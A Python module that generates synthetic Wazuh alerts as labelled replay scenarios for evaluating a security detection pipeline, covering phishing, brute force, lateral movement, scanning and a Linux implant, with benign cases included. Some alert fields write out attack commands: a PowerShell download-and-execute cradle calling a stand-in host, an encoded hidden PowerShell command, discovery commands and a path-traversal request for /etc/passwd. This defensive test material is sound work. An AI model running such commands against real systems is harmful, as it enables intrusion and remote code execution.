"""Repeatable replay scenarios with ground truth (blueprint sections 22 and 24).

These are *synthetic* Wazuh alerts shaped like the alerts.json output of a Wazuh manager
receiving Sysmon, Windows Security, Linux, Suricata and Zeek telemetry. They let the
pipeline be evaluated deterministically without running attacks. Rule ids are in the
custom range (100000+) because they stand in for the lab's own rule set; replace them with
alerts captured from your lab (``python -m evaluation.capture``-style exports or the Wazuh
indexer) for the final study.

External addresses use documentation ranges (RFC 5737) and domains use the reserved
``.example`` TLD, so nothing here points at a real system.
"""

from __future__ import annotations

import itertools
import json
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

BASE_TIME = datetime(2026, 1, 12, 9, 0, tzinfo=UTC)

AGENTS = {
    "dc": {"id": "001", "name": "dc01", "ip": "192.168.50.50"},
    "win": {"id": "002", "name": "win-client01", "ip": "192.168.50.60"},
    "linux": {"id": "003", "name": "linux-srv01", "ip": "192.168.50.70"},
    "sensor": {"id": "004", "name": "sensor01", "ip": "192.168.50.40"},
}
KALI = "192.168.50.100"
C2_IP = "203.0.113.45"
C2_IP_2 = "198.51.100.23"
C2_IP_3 = "203.0.113.77"
DROPPER_SHA256 = "5f3c1e0a9b7d2c4e6f8a0b1c3d5e7f9a1b3c5d7e9f0a2b4c6d8e0f1a3b5c7d9e"
LINUX_IMPLANT_SHA256 = "9a8b7c6d5e4f30211203f4e5d6c7b8a99a8b7c6d5e4f30211203f4e5d6c7b8a9"

_ids = itertools.count(1)


@dataclass
class Scenario:
    name: str
    description: str
    label: str  # malicious | benign
    expected_actions: list[str]
    techniques: list[str]
    alerts: list[dict[str, Any]]
    threat_intel: dict[str, str] = field(default_factory=dict)  # indicator -> verdict (stands in for MISP)


def wazuh_alert(
    start: datetime,
    seconds: int,
    rule_id: int,
    level: int,
    description: str,
    groups: list[str],
    agent: str,
    data: dict[str, Any],
    mitre: list[str] | None = None,
    extra: dict[str, Any] | None = None,
) -> dict[str, Any]:
    ts = start + timedelta(seconds=seconds)
    rule: dict[str, Any] = {"id": str(rule_id), "level": level, "description": description, "groups": groups}
    if mitre:
        rule["mitre"] = {"id": mitre}
    alert = {
        "id": f"{int(ts.timestamp())}.{next(_ids)}",
        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
        "rule": rule,
        "agent": dict(AGENTS[agent]),
        "manager": {"name": "wazuh.manager"},
        "decoder": {"name": "json" if agent == "sensor" else "windows_eventchannel"},
        "data": data,
    }
    alert.update(extra or {})
    return alert


def sysmon(event_id: int, **fields: Any) -> dict[str, Any]:
    return {
        "win": {"system": {"eventID": str(event_id), "providerName": "Microsoft-Windows-Sysmon"}, "eventdata": fields}
    }


def winsec(event_id: int, **fields: Any) -> dict[str, Any]:
    return {
        "win": {
            "system": {"eventID": str(event_id), "providerName": "Microsoft-Windows-Security-Auditing"},
            "eventdata": fields,
        }
    }


def phishing_powershell(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    user = "LAB\\alice"
    alerts = [
        wazuh_alert(
            t,
            0,
            100210,
            6,
            "Office application wrote a macro-enabled document to Downloads",
            ["sysmon", "sysmon_event_11"],
            "win",
            sysmon(
                11,
                image="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                targetFilename="C:\\Users\\alice\\Downloads\\Invoice_2291.docm",
                user=user,
            ),
            ["T1566.001"],
        ),
        wazuh_alert(
            t,
            45,
            100211,
            12,
            "Office application spawned encoded PowerShell",
            ["sysmon", "sysmon_event1"],
            "win",
            sysmon(
                1,
                image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                parentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                commandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...",
                user=user,
                hashes="SHA256=" + "1" * 64,
            ),
            ["T1059.001", "T1204.002"],
        ),
        wazuh_alert(
            t,
            50,
            100212,
            8,
            "DNS query for newly observed domain by PowerShell",
            ["sysmon", "sysmon_event_22"],
            "win",
            sysmon(
                22,
                image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                queryName="invoice-cdn.example",
                user=user,
            ),
            ["T1071.001"],
        ),
        wazuh_alert(
            t,
            52,
            100213,
            10,
            "PowerShell outbound connection to external host",
            ["sysmon", "sysmon_event3"],
            "win",
            sysmon(
                3,
                image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                sourceIp="192.168.50.60",
                destinationIp=C2_IP,
                destinationPort="443",
                user=user,
            ),
            ["T1071.001"],
        ),
        wazuh_alert(
            t,
            60,
            100214,
            10,
            "PowerShell wrote an executable to the user's temp directory",
            ["sysmon", "sysmon_event_11"],
            "win",
            sysmon(
                11,
                image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                targetFilename="C:\\Users\\alice\\AppData\\Local\\Temp\\upd.exe",
                hashes=f"SHA256={DROPPER_SHA256}",
                user=user,
            ),
            ["T1105"],
        ),
        wazuh_alert(
            t,
            75,
            100215,
            12,
            "Executable launched from user temp directory by PowerShell",
            ["sysmon", "sysmon_event1"],
            "win",
            sysmon(
                1,
                image="C:\\Users\\alice\\AppData\\Local\\Temp\\upd.exe",
                parentImage="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                commandLine="upd.exe /silent",
                hashes=f"SHA256={DROPPER_SHA256}",
                user=user,
            ),
            ["T1204.002"],
        ),
    ]
    return Scenario(
        name="phishing_powershell_download",
        description="Phishing attachment -> PowerShell -> download -> execution (win-client01)",
        label="malicious",
        expected_actions=["ISOLATE_HOST", "BLOCK_IP", "COLLECT_EVIDENCE"],
        techniques=["T1566.001", "T1059.001", "T1105", "T1204.002", "T1071.001"],
        alerts=alerts,
        threat_intel={C2_IP: "malicious", DROPPER_SHA256: "malicious", "invoice-cdn.example": "suspicious"},
    )


def credential_lateral(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    failures = [
        wazuh_alert(
            t,
            5 * i,
            100220,
            5,
            "Windows logon failure",
            ["windows", "authentication_failed"],
            "dc",
            winsec(4625, targetUserName="bob", ipAddress=KALI, logonType="3"),
            ["T1110.001"],
        )
        for i in range(8)
    ]
    alerts = failures + [
        wazuh_alert(
            t,
            45,
            100221,
            10,
            "Multiple Windows logon failures for one account (possible brute force)",
            ["windows", "authentication_failures"],
            "dc",
            winsec(4625, targetUserName="bob", ipAddress=KALI),
            ["T1110.001"],
        ),
        wazuh_alert(
            t,
            60,
            100222,
            8,
            "Successful network logon after repeated failures",
            ["windows", "authentication_success"],
            "dc",
            winsec(4624, targetUserName="bob", ipAddress=KALI, logonType="3"),
            ["T1078"],
        ),
        wazuh_alert(
            t,
            120,
            100223,
            12,
            "Remote service installed through admin share (PsExec-like)",
            ["windows", "service_installed"],
            "win",
            winsec(
                7045,
                serviceName="PSEXESVC",
                imagePath="%SystemRoot%\\PSEXESVC.exe",
                subjectUserName="bob",
                targetUserName="bob",
                ipAddress=KALI,
            ),
            ["T1021.002", "T1569.002"],
        ),
    ]
    return Scenario(
        name="credential_attack_lateral_movement",
        description="Credential attack -> valid account -> lateral movement (dc01 -> win-client01)",
        label="malicious",
        expected_actions=["DISABLE_USER", "ISOLATE_HOST", "BLOCK_IP"],
        techniques=["T1110.001", "T1078", "T1021.002"],
        alerts=alerts,
    )


def powershell_outbound(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    user = "LAB\\dave"
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    alerts = [
        wazuh_alert(
            t,
            0,
            100230,
            12,
            "PowerShell download cradle (IEX + DownloadString)",
            ["sysmon", "sysmon_event1"],
            "win",
            sysmon(
                1,
                image=ps,
                parentImage="C:\\Windows\\explorer.exe",
                commandLine=f'powershell -c "IEX (New-Object Net.WebClient).DownloadString('
                f"'http://{C2_IP_2}:8080/a.ps1')\"",
                user=user,
            ),
            ["T1059.001", "T1105"],
        ),
        wazuh_alert(
            t,
            20,
            100231,
            7,
            "Discovery commands executed by PowerShell child process",
            ["sysmon", "sysmon_event1"],
            "win",
            sysmon(
                1,
                image="C:\\Windows\\System32\\cmd.exe",
                parentImage=ps,
                commandLine='cmd.exe /c whoami /all & net group "domain admins" /domain',
                user=user,
            ),
            ["T1059.003"],
        ),
        wazuh_alert(
            t,
            30,
            100232,
            10,
            "PowerShell outbound connection to external host on uncommon port",
            ["sysmon", "sysmon_event3"],
            "win",
            sysmon(3, image=ps, sourceIp="192.168.50.60", destinationIp=C2_IP_2, destinationPort="8080", user=user),
            ["T1071.001"],
        ),
    ]
    return Scenario(
        name="suspicious_powershell_outbound",
        description="Suspicious PowerShell -> command execution -> outbound connection (win-client01)",
        label="malicious",
        expected_actions=["ISOLATE_HOST", "BLOCK_IP", "COLLECT_EVIDENCE"],
        techniques=["T1059.001", "T1059.003", "T1071.001"],
        alerts=alerts,
        threat_intel={C2_IP_2: "suspicious"},
    )


def scan_exploit(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    target = AGENTS["linux"]["ip"]
    alerts = [
        wazuh_alert(
            t,
            0,
            100240,
            8,
            "Zeek: port scan detected (Scan::Port_Scan)",
            ["zeek", "ids"],
            "sensor",
            {
                "note": "Scan::Port_Scan",
                "src": KALI,
                "id.orig_h": KALI,
                "id.resp_h": target,
                "msg": f"{KALI} scanned at least 15 unique ports of host {target}",
                "agentic_source": "zeek.notice",
            },
            ["T1046"],
        ),
        wazuh_alert(
            t,
            40,
            100241,
            8,
            "Suricata: ET SCAN Nmap Scripting Engine User-Agent Detected",
            ["ids", "suricata"],
            "sensor",
            {
                "event_type": "alert",
                "src_ip": KALI,
                "src_port": "51522",
                "dest_ip": target,
                "dest_port": "80",
                "proto": "TCP",
                "alert": {"signature": "ET SCAN Nmap Scripting Engine User-Agent Detected", "severity": "2"},
                "http": {"hostname": target, "url": "/"},
            },
            ["T1595"],
        ),
        wazuh_alert(
            t,
            90,
            100242,
            12,
            "Suricata: web application exploitation attempt (path traversal)",
            ["ids", "suricata"],
            "sensor",
            {
                "event_type": "alert",
                "src_ip": KALI,
                "src_port": "51600",
                "dest_ip": target,
                "dest_port": "80",
                "proto": "TCP",
                "alert": {"signature": "ET WEB_SERVER Possible Directory Traversal Attempt", "severity": "1"},
                "http": {"hostname": target, "url": "/cgi-bin/../../../../etc/passwd"},
            },
            ["T1190"],
        ),
        wazuh_alert(
            t,
            92,
            100243,
            7,
            "Apache: multiple 400/404 responses from one source",
            ["web", "accesslog", "attack"],
            "linux",
            {"srcip": KALI, "url": "/cgi-bin/../../../../etc/passwd", "id": "404"},
            ["T1190"],
        ),
    ]
    return Scenario(
        name="scan_enumeration_exploit",
        description="Port scan -> service enumeration -> controlled exploitation attempt (linux-srv01)",
        label="malicious",
        expected_actions=["BLOCK_IP", "COLLECT_EVIDENCE"],
        techniques=["T1046", "T1595", "T1190"],
        alerts=alerts,
    )


def malicious_file_linux(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    path = "/tmp/.x/kworkerd"  # noqa: S108 - synthetic telemetry, not a file this code touches
    alerts = [
        wazuh_alert(
            t,
            0,
            100250,
            7,
            "File added to the system in a hidden temp directory",
            ["ossec", "syscheck", "syscheck_entry_added"],
            "linux",
            {},
            None,
            {"syscheck": {"path": path, "event": "added", "sha256_after": LINUX_IMPLANT_SHA256}},
        ),
        wazuh_alert(
            t,
            30,
            100251,
            12,
            "Execution of a binary from a hidden temp directory (auditd)",
            ["audit", "audit_command"],
            "linux",
            {"audit": {"exe": path, "command": "kworkerd", "auid_name": "www-data"}},
            ["T1204.002", "T1059.004"],
        ),
        wazuh_alert(
            t,
            40,
            100252,
            13,
            "Suricata: ET MALWARE possible reverse shell outbound",
            ["ids", "suricata"],
            "sensor",
            {
                "event_type": "alert",
                "src_ip": AGENTS["linux"]["ip"],
                "src_port": "40112",
                "dest_ip": C2_IP_3,
                "dest_port": "4444",
                "proto": "TCP",
                "alert": {"signature": "ET MALWARE Possible Reverse Shell Outbound", "severity": "1"},
            },
            ["T1071"],
        ),
    ]
    return Scenario(
        name="malicious_file_execution_c2",
        description="Malicious file -> execution -> network communication (linux-srv01)",
        label="malicious",
        expected_actions=["ISOLATE_HOST", "BLOCK_IP", "COLLECT_EVIDENCE"],
        techniques=["T1204.002", "T1059.004", "T1071"],
        alerts=alerts,
        threat_intel={LINUX_IMPLANT_SHA256: "malicious", C2_IP_3: "malicious"},
    )


def benign_admin_powershell(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    alerts = [
        wazuh_alert(
            t,
            0,
            100260,
            5,
            "PowerShell script executed by an administrator",
            ["sysmon", "sysmon_event1"],
            "win",
            sysmon(
                1,
                image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                parentImage="C:\\Windows\\explorer.exe",
                commandLine="powershell.exe -File C:\\Scripts\\Get-PatchStatus.ps1",
                user="LAB\\it-ops",
            ),
            ["T1059.001"],
        ),
    ]
    return Scenario(
        "benign_admin_powershell",
        "Scheduled admin PowerShell inventory script",
        "benign",
        ["NONE", "MONITOR"],
        [],
        alerts,
    )


def benign_failed_ssh(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    alerts = [
        wazuh_alert(
            t,
            0,
            100270,
            5,
            "sshd: authentication failed",
            ["syslog", "sshd", "authentication_failed"],
            "linux",
            {"srcip": "192.168.50.60", "dstuser": "carol"},
            ["T1110.001"],
        ),
    ]
    return Scenario(
        "benign_failed_ssh",
        "Single mistyped SSH password from an internal workstation",
        "benign",
        ["NONE", "MONITOR"],
        [],
        alerts,
    )


def benign_package_update(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    alerts = [
        wazuh_alert(
            t,
            0,
            100280,
            3,
            "New package installed",
            ["syslog", "dpkg", "config_changed"],
            "linux",
            {"package": "openssl", "version": "3.0.13-0ubuntu3.4"},
        ),
        wazuh_alert(
            t,
            5,
            100281,
            4,
            "Zeek: HTTP download from package mirror",
            ["zeek"],
            "sensor",
            {
                "id.orig_h": AGENTS["linux"]["ip"],
                "id.resp_h": "198.51.100.200",
                "host": "mirror.ubuntu.example",
                "uri": "/ubuntu/pool/main/o/openssl/",
                "agentic_source": "zeek.http",
            },
        ),
    ]
    return Scenario(
        "benign_package_update",
        "Routine package update from the distribution mirror",
        "benign",
        ["NONE", "MONITOR"],
        [],
        alerts,
        {"198.51.100.200": "harmless"},
    )


def benign_scheduled_task(day: int) -> Scenario:
    t = BASE_TIME + timedelta(days=day)
    alerts = [
        wazuh_alert(
            t,
            0,
            100290,
            6,
            "Scheduled task created",
            ["windows", "sysmon", "sysmon_event1"],
            "win",
            sysmon(
                1,
                image="C:\\Windows\\System32\\schtasks.exe",
                parentImage="C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
                commandLine='schtasks.exe /create /tn "Windows Defender Scheduled Scan" /sc daily',
                user="NT AUTHORITY\\SYSTEM",
            ),
            ["T1053.005"],
        ),
    ]
    return Scenario(
        "benign_defender_scheduled_task",
        "Defender maintenance creating its scheduled scan",
        "benign",
        ["NONE", "MONITOR"],
        [],
        alerts,
    )


def load_scenarios() -> list[Scenario]:
    builders = [
        phishing_powershell,
        credential_lateral,
        powershell_outbound,
        scan_exploit,
        malicious_file_linux,
        benign_admin_powershell,
        benign_failed_ssh,
        benign_package_update,
        benign_scheduled_task,
    ]
    # One scenario per simulated day so incidents from different scenarios never correlate.
    return [build(day) for day, build in enumerate(builders)]


def export(directory: Path) -> list[Path]:
    """Write each scenario as JSON (for editing, or replaying with scripts/replay_alerts.py)."""
    directory.mkdir(parents=True, exist_ok=True)
    paths = []
    for scenario in load_scenarios():
        path = directory / f"{scenario.name}.json"
        path.write_text(json.dumps(scenario.__dict__, indent=2), encoding="utf-8")
        paths.append(path)
    return paths


def load_from_directory(directory: Path) -> list[Scenario]:
    return [Scenario(**json.loads(p.read_text(encoding="utf-8"))) for p in sorted(directory.glob("*.json"))]


if __name__ == "__main__":  # pragma: no cover
    import sys

    for p in export(Path(sys.argv[1] if len(sys.argv) > 1 else "evaluation/scenarios")):
        print(p)
